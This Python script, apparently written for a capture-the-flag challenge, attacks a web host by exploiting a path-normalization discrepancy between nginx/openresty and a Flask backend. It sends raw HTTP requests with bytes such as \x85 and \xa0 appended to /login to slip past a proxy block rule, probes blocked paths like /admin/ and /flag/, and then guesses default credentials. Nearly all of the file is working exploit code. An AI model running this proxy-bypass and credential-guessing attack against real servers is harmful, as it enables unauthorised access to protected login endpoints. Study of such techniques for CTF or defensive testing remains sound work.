#!/usr/bin/env python3
"""
Reference script: Test POST /login bypass via Flask-Nginx path normalization discrepancy.

Background:
- openresty (nginx) blocks POST to /login -> 405
- Flask backend likely has a POST /login handler
- Flask strips certain characters (\x85, \xa0, etc.) from URL path that nginx doesn't
- Sending POST /login\x85 -> nginx sees /login\x85 (not matching block rule), Flask sees /login

Usage: python3 reference_post_bypass.py
"""

import socket
import time
import sys

TARGET_HOST = "2273095efcf1270253338a5c.http-ctf2.dasctf.com"
TARGET_PORT = 80

# Flask bypass characters (from HackTricks path normalization research)
BYPASS_CHARS = [
    (b"\x85", r"\x85"),
    (b"\xa0", r"\xa0"),
    (b"\x1f", r"\x1f"),
    (b"\x1e", r"\x1e"),
    (b"\x1d", r"\x1d"),
    (b"\x1c", r"\x1c"),
    (b"\x0c", r"\x0c"),
    (b"\x0b", r"\x0b"),
    (b"\x09", r"\x09 (tab)"),
    (b";", "; (semicolon)"),
]

# Path variants that already reach Flask backend (539-byte GET response)
PATH_VARIANTS = [b"//login", b"/%6cogin", b"/%4cogin", b"/Login"]

# Multi-segment paths normally blocked by openresty (654-byte 404)
MULTI_PATHS = [b"/admin/", b"/api/", b"/flag/", b"/console/", b"/debug/",
               b"/source/", b"/config/", b"/internal/", b"/secret/"]


def send_raw(method: bytes, path: bytes, body: bytes = b"",
             content_type: str = "application/x-www-form-urlencoded") -> tuple:
    """Send raw HTTP request with byte-level path control. Returns (status, header_len, body, elapsed)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = b"%s %s HTTP/1.1\r\nHost: %s\r\n" % (method, path, TARGET_HOST.encode())
    if body:
        req += b"Content-Type: %s\r\nContent-Length: %d\r\n" % (content_type.encode(), len(body))
    req += b"Connection: close\r\n\r\n"
    if body:
        req += body

    sock.sendall(req)
    resp = b""
    start = time.time()
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            resp += data
        except socket.timeout:
            break
    elapsed = time.time() - start
    sock.close()

    if b"\r\n\r\n" in resp:
        hdr, bod = resp.split(b"\r\n\r\n", 1)
    else:
        hdr, bod = resp, b""

    status_line = hdr.split(b"\r\n")[0].decode("utf-8", errors="replace")
    return status_line, len(bod), bod, elapsed, hdr.decode("utf-8", errors="replace")


def main():
    print("=" * 70)
    print("POST /login Bypass via Path Normalization Discrepancy")
    print("Target: {}:{}".format(TARGET_HOST, TARGET_PORT))
    print("=" * 70)

    # --- Baselines ---
    print("\n--- Baselines ---")
    s, bl, _, el, _ = send_raw(b"GET", b"/login")
    print(f"GET  /login        -> {s} | body={bl}b | {el:.2f}s  (expect 404/539)")
    s, bl, _, el, _ = send_raw(b"POST", b"/login", b"username=admin&password=admin")
    print(f"POST /login        -> {s} | body={bl}b | {el:.2f}s  (expect 405/178)")
    s, bl, _, el, _ = send_raw(b"POST", b"/testxxx", b"username=admin&password=admin")
    print(f"POST /testxxx      -> {s} | body={bl}b | {el:.2f}s  (check if POST globally blocked)")

    # --- Test 1: POST /login + Flask bypass chars (body params) ---
    print("\n--- Test 1: POST /login< bypass_char > (body params) ---")
    creds = b"username=admin&password=admin"
    for ch, desc in BYPASS_CHARS:
        s, bl, bod, el, hdr = send_raw(b"POST", b"/login" + ch, creds)
        marker = ""
        if "405" not in s and bl != 178:
            marker = "  *** POTENTIAL BYPASS!"
        print(f"POST /login{desc:16s} -> {s} | body={bl}b | {el:.2f}s{marker}")
        if marker:
            print(f"  Headers:\n{hdr[:600]}")
            print(f"  Body:\n{bod.decode('utf-8', errors='replace')[:500]}")

    # --- Test 2: POST /login + bypass chars (query params, since form uses GET) ---
    print("\n--- Test 2: POST /login< bypass_char >?username=admin&password=admin ---")
    for ch, desc in BYPASS_CHARS[:4]:
        path = b"/login" + ch + b"?username=admin&password=admin"
        s, bl, bod, el, hdr = send_raw(b"POST", path)
        marker = ""
        if "405" not in s and bl != 178:
            marker = "  *** POTENTIAL BYPASS!"
        print(f"POST /login{desc}?... -> {s} | body={bl}b | {el:.2f}s{marker}")
        if marker:
            print(f"  Headers:\n{hdr[:600]}")
            print(f"  Body:\n{bod.decode('utf-8', errors='replace')[:500]}")

    # --- Test 3: POST to path variants that already reach Flask ---
    print("\n--- Test 3: POST to path variants (known to reach Flask) ---")
    for path in PATH_VARIANTS:
        s, bl, bod, el, hdr = send_raw(b"POST", path, creds)
        marker = ""
        if "405" not in s and bl != 178:
            marker = "  *** POTENTIAL BYPASS!"
        print(f"POST {path.decode():16s} -> {s} | body={bl}b | {el:.2f}s{marker}")
        if marker:
            print(f"  Body:\n{bod.decode('utf-8', errors='replace')[:500]}")

    # --- Test 4: GET multi-segment paths with bypass chars ---
    print("\n--- Test 4: GET multi-segment paths + \\x85/\\xa0 (normally blocked by openresty) ---")
    for prefix in MULTI_PATHS:
        for ch, desc in [(b"\x85", r"\x85"), (b"\xa0", r"\xa0")]:
            path = prefix + ch
            s, bl, bod, el, hdr = send_raw(b"GET", path)
            # 654 = openresty blocked, other = bypassed to Flask
            if bl != 654:
                print(f"GET {prefix.decode()}{desc:5s} -> {s} | body={bl}b | {el:.2f}s  *** REACHED BACKEND")
                print(f"  Body:\n{bod.decode('utf-8', errors='replace')[:300]}")

    # --- Test 5: If any bypass found, try credentials + payloads ---
    print("\n--- Test 5: Credential variations on best bypass candidate ---")
    # Auto-detect: try \x85 first, then \xa0
    for ch, desc in [(b"\x85", r"\x85"), (b"\xa0", r"\xa0")]:
        s, bl, bod, el, hdr = send_raw(b"POST", b"/login" + ch, creds)
        if "405" not in s:
            print(f"\nBypass confirmed with {desc}! Testing credentials...")
            for user, pwd in [("admin", "admin"), ("admin", "password"),
                              ("admin", "123456"), ("guest", "guest"),
                              ("root", "root"), ("admin", "flag")]:
                body = f"username={user}&password={pwd}".encode()
                s2, bl2, bod2, el2, _ = send_raw(b"POST", b"/login" + ch, body)
                print(f"  {user}/{pwd:12s} -> {s2} | body={bl2}b | {el2:.2f}s")
                if "200" in s2 or "302" in s2 or "flag" in bod2.decode("utf-8", errors="replace").lower():
                    print(f"    *** FOUND! Body:\n{bod2.decode('utf-8', errors='replace')[:500]}")
            break
    else:
        print("(No POST bypass found with \\x85 or \\xa0. Try other chars or HTTP smuggling.)")

    print("\n--- Done ---")


if __name__ == "__main__":
    main()
